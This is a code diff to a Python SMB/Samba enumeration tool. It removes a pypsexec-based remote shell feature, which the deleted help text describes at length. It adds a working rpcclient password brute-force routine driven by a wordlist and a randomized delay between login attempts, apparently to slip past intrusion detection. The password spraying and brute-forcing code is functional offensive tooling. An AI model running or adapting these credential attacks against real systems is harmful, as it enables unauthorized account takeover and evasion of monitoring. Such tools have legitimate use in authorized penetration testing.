@@ -7,6 +7,7 @@ import terminaltables;
 import re;
 import sys;
 import time;
+import random;
 from termcolor import cprint;
 
 #Global Vars
@@ -92,18 +93,13 @@ def setArgs(uargs):
         uargs.o = True;
         uargs.n = True;
         uargs.i = True;
+        uargs.brute = False;
+        uargs.spray = False;
     elif not uargs.U and not uargs.S and not uargs.G and not uargs.r and not uargs.p and not uargs.P and not uargs.o and not uargs.n and not uargs.i and not uargs.e:
         uargs.a = True;
-    elif uargs.shell:
-        uargs.a = False;
-        uargs.U = False;
-        uargs.S = False;
-        uargs.G = False;
-        uargs.r = False;
-        uargs.P = False;
-        uargs.o = False;
-        uargs.n = False;
-        uargs.i = False;
+    elif uargs.spray and uargs.brute:
+        cprint("[E]: You may only choose to brute force or spray passwords in a single instance", "red", attrs=["bold"]);
+        exit(1);
     elif uargs.spray:
         uargs.U = True;
     else:
@@ -212,31 +208,12 @@ def getArgs():
     addops.add_argument("-s", required=False, type=str, default=None, help="path to list for brute force guessing share names");
     addops.add_argument("-R", required=False, type=str, nargs='+', default=["500-550", "1000-1050"], help="RID ranges to enumerate (default: rid_range, implies -r) Use spaces to try several rid ranges: -R 0-100 1000-2500 500-600)");
 
-    passpray = parser.add_argument_group("Password spraying options");
-    passpray.add_argument("--spray", required=False, type=str, default=None, help="Perform password spray using rpcclient (value should be password to spray, a user list is built when enumerating them if possible)");
-    passpray.add_argument("--timeout", required=False, type=int, default=0, help="The timeout period in between each credential check when password spraying (timeout is in seconds)");
-    # passpray.add_argument("--randtimeout", required=False, type=int, default=0, help="The timeout period in between each credential check when password spraying (timeout is in seconds)"); #add this to try and avoid detection from ips, ids and siems?
-
-    pypseshell = parser.add_argument_group("""Options For Remote Code Execution via PyPsexec:
-    [1] https://pypi.org/project/pypsexec/
-    [2] https://www.bloggingforlogging.com/2018/03/12/introducing-psexec-for-python
-    
-    [+] NOTE THAT THE FOLLOWING REQUIREMENTS NEED TO BE FULFILLED:
-        [1] Port 445 and SMB need to be enabled on the target
-        [2] The ADMIN$ needs to be enabled on the target (this is enabled by default)
-        [3] The credentials of the account being used must be a member of the local Administrators group on the target (net localgroup Administrators)
-        [4] The credentials fo the account being used must have a fully elevated (administrative) token for remote logon (see link 2 above for more information)
-    
-    [+] An administrative token that allows you to execute commands remotely by starting the PAexec payload on the target can stem from one of the folowing
-        [1] In a domain/Active Directory environment, use the credentials belonging to a domain/Active Directory account that is member of local Administrators group on the target
-        [2] Use any user that is a member of the local Administrator group on a remote target in which the 'LocalAccountTokenFilterPolicy' is set to 1
-        [*] See link 2 for other ways
-    """);
-    pypseshell.add_argument("--shell", required=False, action="store_true", default=False, help="Start a shell with the supplied credentials on the target machine with pypsexec (most likely will need privileged credentials)");
-    pypseshell.add_argument("--system", required=False, action="store_true", default=False, help="Start process as nt authority\\system local account");
-    pypseshell.add_argument("--executable", required=False, type=str, default="powershell.exe", help="executable to use to start process (usually this will be cmd.exe or powershell.exe) (default: 'powershell.exe')");
-    pypseshell.add_argument("--interactive", required=False, action="store_true", default=False, help="use this when you need to run the remote process in interactive mode. Note that stdout will not be printed to terminal");
-    pypseshell.add_argument("--encrypt", required=False, action="store_true", default=False, help="encrypt command calls to the remote target host");
+    passops = parser.add_argument_group("Password spraying and brute forcing options");
+    passops.add_argument("--brute", required=False, type=str, default=None, help="Perform brute forcing using rpcclient (value should be username)");
+    passops.add_argument("--wordlist", required=False, type=str, default=None, help="Wordlist to use when brute forcing (value should be absolute path to wordlist)");
+    passops.add_argument("--spray", required=False, type=str, default=None, help="Perform password spray using rpcclient (value should be password to spray, a user list is built when enumerating them if possible)");
+    passops.add_argument("--timeout", required=False, type=int, default=None, help="The timeout period in between each credential check when password spraying (timeout is in seconds) (default: None)");
+    passops.add_argument("--randtimeout", required=False, type=int, default=None, help="The celling value for random timeout period in between each credential check when password spraying (timeout is in seconds starting at 0 tp <value given> (default: None))");
 
     return parser.parse_args();
 
@@ -729,57 +706,62 @@ def pass_spray(args):
             output = subprocess.Popen(["rpcclient", "-W", args.w, "-U", "{}%{}".format(user, args.spray), "-c getusername;quit", args.t], stdout=subprocess.PIPE).stdout.read().decode("UTF-8");
 
             if output.find("Cannot connect to server") > -1 or output.find("Error was NT_STATUS_LOGON_FAILURE") > -1:
-                cprint("[-] Username: {}\tPassword: {}\tResult: invalid".format(user, args.spray), "red", attrs=["bold"]);
+                cprint("[-] Username: '{}'\tPassword: '{}'\tResult: invalid".format(user, args.spray), "red", attrs=["bold"]);
             elif output.find("Account Name") > -1 or output.find("Authority Name") > -1:
-                cprint("[+] Username: {}\tPassword: {}\tResult: !*****VALID*****!".format(user, args.spray), "green", attrs=["bold"]);
+                cprint("[+] Username: '{}'\tPassword: '{}'\tResult: !*****VALID*****!".format(user, args.spray), "green", attrs=["bold"]);
             else:
                 print(output);
 
-            time.sleep(args.timeout);
+            if args.timeout and args.randtimeout is None:
+                if args.v:
+                    cprint("[V] Timeout for {} seconds".format(str(args.timeout)), "yellow", attrs=["bold"]);
+
+                time.sleep(float(args.timeout));
+            elif args.timeout is None and args.randtimeout:
+                tout = random.randint(0, args.randtimeout);
+
+                if args.v:
+                    cprint("[V] Timeout for {} seconds".format(str(tout)), "yellow", attrs=["bold"]);
+
+                time.sleep(float(tout));
 
         print("");
     except subprocess.CalledProcessError as cpe:
         cprint(cpe.output.decode("UTF-8"), "red", attrs=["bold"]);
 
 
-def shell_pypsexec(args):
-    import pypsexec.client;
-    client = pypsexec.client.Client(server=args.t, username=args.u, password=args.p, encrypt=args.encrypt);
-
+def brute_pass(args):
     try:
-        client.connect();
-        client.create_service()
-        ucmdargs = None;
-        program = args.executable;
+        words = open(args.wordlist, "r").read().splitlines();
 
-        while True:
-            ucmdargs = input("Arguments to supply remote process: ");
-            if ucmdargs:
-                if ucmdargs.find("exit") > -1:
-                    break;
-                else:
-                    if program.find("cmd") > -1:
-                        ucmdargs = "/c {}".format(ucmdargs);
+        for word in words:
+            output = subprocess.Popen(["rpcclient", "-W", args.w, "-U", "{}%{}".format(args.brute, word), args.t, "-c getusername;quit"], stdout=subprocess.PIPE).stdout.read().decode("UTF-8");
 
-                    stdout, stderr, rc = client.run_executable(executable=program, arguments=ucmdargs, use_system_account=args.system, interactive=args.interactive);
-                    print(stdout.decode("UTF-8"));
-                    print(stderr.decode("UTF-8"));
+            if output.find("Cannot connect to server") > -1 or output.find("Error was NT_STATUS_LOGON_FAILURE") > -1:
+                cprint("[-] Username: '{}'\tPassword: '{}'\tResult: invalid".format(args.brute, word), "red", attrs=["bold"]);
+            elif output.find("Account Name") > -1 or output.find("Authority Name") > -1:
+                cprint("[+] Username: '{}'\tPassword: '{}'\tResult: !*****VALID*****!".format(args.brute, word), "green", attrs=["bold"]);
             else:
-                cprint("[E] bad characters", "red", attrs=["bold"]);
-    except Exception as err:
-        cprint(err, "red", attrs=["bold"]);
-    finally:
-        client.remove_service();
-        client.disconnect();
+                print(output);
 
+            if args.timeout and args.randtimeout is None:
+                if args.v:
+                    cprint("[V] Timeout for {} seconds".format(str(args.timeout)), "yellow", attrs=["bold"]);
 
-# def brute(args):
-#     try:
-#         for user in user_list:
-#             for pass in args.brute:
-#                 output = subprocess.Popen(["rpcclient", "-W", args.w, "-U", "{}%{}".format(args.u, args.p), args.t, "-c getusername;quit"], stdout=subprocess.PIPE).stdout.read().decode("UTF-8");
-#     except subprocess.CalledProcessError as cpe:
-#         print(cpe.output.decode("UTF-8"));
+                time.sleep(float(args.timeout));
+            elif args.timeout is None and args.randtimeout:
+                tout = random.randint(0, args.randtimeout);
+
+                if args.v:
+                    cprint("[V] Timeout for {} seconds".format(str(tout)), "yellow", attrs=["bold"]);
+
+                time.sleep(float(tout));
+
+        print("");
+    except subprocess.CalledProcessError as cpe:
+        cprint(cpe.output.decode("UTF-8"), "red", attrs=["bold"]);
+    except FileNotFoundError as fnfe:
+        cprint("[E] File path specified is not valid", "red", attrs=["bold"]);
 
 
 
@@ -970,7 +952,7 @@ Known Usernames -----------> {}
     #Extended functions-------------------------------------------------------------------------------------------
     if carglist.spray:
         if len(user_list) > 0:
-            title = [["Starting password spray against {}".format(carglist.t, carglist.R).title()]];
+            title = [["Starting password spray against {}".format(carglist.t).title()]];
             header = terminaltables.AsciiTable(title);
             print(header.table);
 
@@ -980,13 +962,18 @@ Known Usernames -----------> {}
         else:
             cprint("[E]: Unable to perform password spraying procedures\n", "red", attrs=["bold"]);
 
+    if carglist.brute:
+        if carglist.wordlist:
+            title = [["Starting brute force on {} against user {}".format(carglist.t, carglist.brute).title()]];
+            header = terminaltables.AsciiTable(title);
+            print(header.table);
 
-    if carglist.shell:
-        title = [["Starting reverse shell on {}".format(carglist.t, carglist.R).title()]];
-        header = terminaltables.AsciiTable(title);
-        print(header.table);
+            brute_pass(carglist);
+        elif not carglist.wordlist:
+            cprint("[E]: The absolute path to a wordlist is required\n", "red", attrs=["bold"]);
+        else:
+            cprint("[E]: Unable to perform brute forcing procedures\n", "red", attrs=["bold"]);
 
-        shell_pypsexec(carglist);
 
 
     #Enum4LinuxPy complete----------------------------------------------------------------------------------------
